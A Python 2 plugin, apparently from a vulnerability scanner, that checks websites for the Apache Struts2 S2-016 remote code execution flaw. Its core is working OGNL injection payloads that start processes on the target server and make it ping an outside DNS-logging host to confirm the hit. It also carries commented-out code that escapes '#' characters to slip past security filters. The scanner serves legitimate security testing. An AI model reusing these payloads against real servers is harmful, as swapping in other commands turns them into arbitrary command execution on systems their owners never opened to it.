#!/usr/bin/python
# -*- coding: utf-8 -*-

from re import search as re_search
from urllib import quote

import requests

from engine.engine_utils.common import *
from urlparse import urlparse
from engine.logger import scanLogger as logger
import random
import string

'''
Struts2远程代码执行漏洞（S2-016）
2.3.15.1之前的版本，参数action的值redirect以及redirectAction没有正确过滤，导致ognl代码执行。
'''

def run_url(http,ob,item):
    result = []
    try:
        domain = ob['domain']
        header = {'Host': domain}
        source_ip = ob.get('source_ip')
        url = item['url']
        url = url.split('?')[0]
        url_parse = urlparse(url)
        scheme = url_parse.scheme
        domain = url_parse.netloc
        path = url_parse.path
        query = url_parse.query

        if source_ip:
            domain = source_ip
        if query:
            url = "%s://%s%s?%s" % (scheme, domain, path, query)
        else:
            url = "%s://%s%s" % (scheme, domain, path)
        local_path = urlparse(url).path
        path_tail = local_path.split('/')[-1]
        if not re_search('\.(do|action)', path_tail):
            return

        # 原始恶意请求，在发送请求之前会做urlencode
        original_payloads = [
            """action:${#a=(new java.lang.ProcessBuilder(new java.lang.String[]{'%s'})).start(),
            #b=a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000],
            #d.read(#e),#matt=#context.get('com.opensymphony.xwork2.dispatcher.HttpServletResponse'),#matt.getWriter().println(#e),
            #matt.getWriter().flush(),#matt.getWriter().close()}""",

            """redirect:${#a=(new java.lang.ProcessBuilder(new java.lang.String[]{'%s'})).start(),
            #b=a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),
            #e=new char[50000],#d.read(#e),#matt=#context.get('com.opensymphony.xwork2.dispatcher.HttpServletResponse'),
            #matt.getWriter().println(#e),#matt.getWriter().flush(),#matt.getWriter().close()}""",

            """redirectAction:${#a=(new java.lang.ProcessBuilder(new java.lang.String[]{'%s'})).start(),
            #b=a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),
            #e=new char[50000],#d.read(#e),#matt=#context.get('com.opensymphony.xwork2.dispatcher.HttpServletResponse'),
            #matt.getWriter().println(#e),#matt.getWriter().flush(),#matt.getWriter().close()}"""
        ]
        payload_list = []
        random_str, ping_cmd_list = _cmd_poc()
        for original_payload in original_payloads:
            for ping_cmd in ping_cmd_list:
                payload = original_payload % ping_cmd
                payload_list.append(payload)

        # 转换#绕过安全检测 urlencode最后会做，这里不对#做urlencode
        list2 = []
        # for value in payload_list:
        #     for tamper in ["\\u0023","\\43"]:
        #         new_value = value.replace("#", tamper)
        #         list2.append(new_value)

        # 转换空格满足ongl语法限制 urlencode最后会做，这里不对空格做urlencode
        list3 = []
        # for value in list2:
        #     for tamper in ["+", "\\40"]:
        #         new_value = value.replace(" ", tamper)
        #         list3.append(new_value)

        inj_value_list = payload_list + list2 + list3
        for inj_value in inj_value_list:
            inj_value = quote(inj_value, safe="=.()")
            new_url = '%s?%s' % (url, inj_value)
            res, content = http.request(new_url, 'GET', headers=header)
            if callback(random_str):
                detail = "检测到Struts2远程命令执行漏洞"
                request = getRequest(new_url, domain=ob['domain'])
                response = getResponse(res, content)
                result.append(getRecord(ob, new_url, ob['level'],detail,request,response))
                break

    except Exception, e:
        logger.error("File:Struts2_S2_016Script_yd.py, run_url function :%s" % (str(e)))

    return result


# 生产随机子域名
def _cmd_poc():
    dns_log_domain = "test.cloudflarepro.com"
    random_str = ''.join(random.sample(string.ascii_letters + string.digits, 17))
    random_domain = random_str + '.' + dns_log_domain
    # if 'Windows' == platform.system():
    #     ping_cmd = 'ping -n 3 {}'.format(random_domain)
    # else:
    ping_linux = 'ping -c 3 {}'.format(random_domain)
    ping_win = 'ping -n 3 {}'.format(random_domain)
    return random_str, [ping_linux, ping_win]


def callback(random_str):
    api = 'http://admin.cloudflarepro.com/api/dns/test/{}/'
    r = requests.get(api.format(random_str))
    res = r.text
    return True if 'True' == res else False